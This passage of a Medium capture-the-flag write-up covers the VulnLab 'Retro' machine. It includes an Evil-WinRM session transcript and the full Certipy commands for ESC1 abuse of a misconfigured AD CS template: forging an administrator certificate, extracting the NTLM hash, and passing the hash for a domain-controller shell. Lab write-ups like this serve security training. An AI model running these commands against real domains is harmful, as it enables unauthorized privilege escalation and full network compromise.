Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami  
retro\administrator  
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls  
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop  
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls  
  
  
Directory: C:\Users\Administrator\desktop  
  
  
Mode LastWriteTime Length Name  
---- ------------- ------ ----  
-a---- 7/25/2023 12:38 PM 36 root.txt  
  
  
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt  
VL{8-----------------------------  
*Evil-WinRM* PS C:\Users\Administrator\desktop>
```

---

### Exploiting ESC1 in AD CS

After confirming that the AD CS instance is vulnerable to **ESC1 (Enterprise CA Security Issue 1)**, we move on to exploitation using **Certipy**. This attack abuses misconfigured certificate templates that allow low-privileged users or machine accounts to request certificates with **privileged user UPNs** (User Principal Names). These certificates can then be used for authentication and privilege escalation.

#### Step 1: Requesting a Certificate as Administrator

We use the **certipy req** command to request a certificate as the `Administrator` user while authenticating with the compromised `Banking$` machine account.

```bash
certipy req -u 'banking$'@retro.vl -p 'banking1234' -c 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator' -key-size 4096 -debug
```

- `-u 'banking$'@retro.vl -p 'banking1234'`: We authenticate as the `Banking$` machine account.
- `-c 'retro-DC-CA' -target 'dc.retro.vl'`: Specifies the Certificate Authority (CA) and domain controller.
- `-template 'RetroClients'`: Requests a certificate using the vulnerable template.
- `-upn 'administrator'`: Sets the UPN to `Administrator`, essentially tricking the CA into issuing a certificate for a highly privileged account.
- `-key-size 4096`: Generates a strong RSA key.

If the template is misconfigured and allows us to specify arbitrary UPNs, we successfully obtain a certificate for **Administrator**.

The output confirms that the certificate was issued and saved as `administrator.pfx`.

---

#### Step 2: Using the Certificate for Authentication

With the certificate in hand, we use **Certipy auth** to authenticate as **Administrator** and retrieve their NTLM hash.

```bash
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.10.124.218
```

- `-pfx 'administrator.pfx'`: Uses the obtained certificate for authentication.
- `-username 'administrator' -domain 'retro.vl'`: Specifies the target user and domain.
- `-dc-ip 10.10.124.218`: Specifies the domain controller’s IP.

The output confirms that we successfully retrieved a **TGT (Ticket Granting Ticket)** and the **NTLM hash** of the `Administrator` account:

```text
aad3b435b51404eeaad3b435b51404ee:252fac706----------
```

---

#### Step 3: Getting a Shell as Administrator

With the **Administrator NTLM hash**, we use **Evil-WinRM** to get a **fully privileged shell** on the domain controller.

```powershell
evil-winrm -i dc.retro.vl -u administrator -H 252fac7066----------------
```

And just like that… **we’re in!** 🎉

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoamiretro\administrator
```

Navigating to the desktop and reading the `root.txt` flag confirms **full domain compromise**!

```text
VL{8b-----------------
```

---

### Final Thoughts

This machine was a great example of **how misconfigured AD CS templates can lead to full domain takeover**. By abusing ESC1, we were able to escalate from a low-privileged **machine account** (`Banking$`) to **Administrator **without even needing to crack any hashes!

🔹 **Key Takeaways:**
 ✅ Always check for AD CS misconfigurations.
 ✅ ESC1 allows for privilege escalation by requesting certificates with privileged UPNs.
 ✅ Certipy is an excellent tool for AD CS enumeration and exploitation.

And that’s another **VulnLab** machine **pwned!** 🔥

![](https://cdn-images-1.medium.com/max/800/0*xbA6DgffiUS2LkBq.gif)

![](https://cdn-images-1.medium.com/max/800/1*bclAD-m5U3vAEvDmB3iCYw.png)

### References

If you want references for this attack, check out our blog post on it!

> 🔗 [https://infosecwriteups.com/escape-unveiled-active-directory-adcs-exploit-walkthrough-85cf58d3185b](https://infosecwriteups.com/escape-unveiled-active-directory-adcs-exploit-walkthrough-85cf58d3185b)

### Do You Wanna Chat with Maverick?🥂

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

![](https://cdn-images-1.medium.com/max/800/0*TyP9SGtBmusRWvj2.gif)

By Mohamed Eletreby on February 18, 2025.

Canonical link

Exported from Medium on April 20, 2026.